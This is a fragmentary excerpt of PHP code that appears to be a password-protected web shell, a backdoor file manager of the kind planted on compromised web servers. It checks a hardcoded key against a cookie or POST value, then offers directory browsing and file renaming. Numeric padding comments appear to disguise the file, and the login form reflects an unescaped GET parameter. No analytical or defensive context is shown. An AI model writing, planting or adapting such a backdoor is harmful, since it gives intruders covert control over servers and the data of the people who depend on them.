...
$auth_key = "fe155c5fae8b9e443e80e286c182fe70";
...
$pass = false;
if (isset($_COOKIE['pw_name_76762'])) {
    if(($_COOKIE['pw_name_76762']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_76762'])) {
        if(($_POST['pw_name_76762']) == $auth_key) {
            setcookie("pw_name_76762", $_POST['pw_name_76762']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_76762' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1727595504533975 1727595504242445 1727595504263491 1727595504846208
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1727595504533975 1727595504242445 1727595504263491 1727595504846208
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1727595504533975 1727595504242445 1727595504263491 1727595504846208
            $name = PATH . "/" . $_GET['r'];
